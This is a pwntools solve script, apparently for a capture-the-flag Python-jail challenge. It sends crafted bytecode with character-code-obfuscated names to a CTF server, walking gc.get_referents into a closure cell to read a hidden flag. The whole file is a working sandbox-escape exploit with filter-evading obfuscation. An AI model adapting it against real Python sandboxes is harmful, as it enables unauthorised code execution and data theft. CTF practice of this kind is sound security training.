from pwn import *
import gc, dis

context.log_level = 'debug'

# conn = process(['python3.12', 'pyjail/jail.py'])
conn = remote("ctf2024-entry.r3kapig.com", 31890)
# conn = remote("localhost", 9999)

# POC
# gc.get_referents(gRc())[-2][0].cell_contents._flag

def func(n):
    print(getattr(getattr(getattr(gc, f"{103:c}{101:c}{116:c}{95:c}{114:c}{101:c}{102:c}{101:c}{114:c}{101:c}{110:c}{116:c}{115:c}")(gRc())
          [-2][0], f"{99:c}{101:c}{108:c}{108:c}{95:c}{99:c}{111:c}{110:c}{116:c}{101:c}{110:c}{116:c}{115:c}"), f"{95:c}{102:c}{108:c}{97:c}{103:c}"))

conn.sendlineafter(b"hex: ", func.__code__.co_code.hex().encode())
conn.sendlineafter(b"comma: ", str(func.__code__.co_consts).replace("'", "").replace(" ", "").encode())
conn.sendlineafter(b"comma: ", str(func.__code__.co_names).replace("'", "").replace(" ", "").encode())
conn.sendlineafter(b"size: ", str(func.__code__.co_stacksize).encode())
print(conn.recvall().decode())

conn.close()
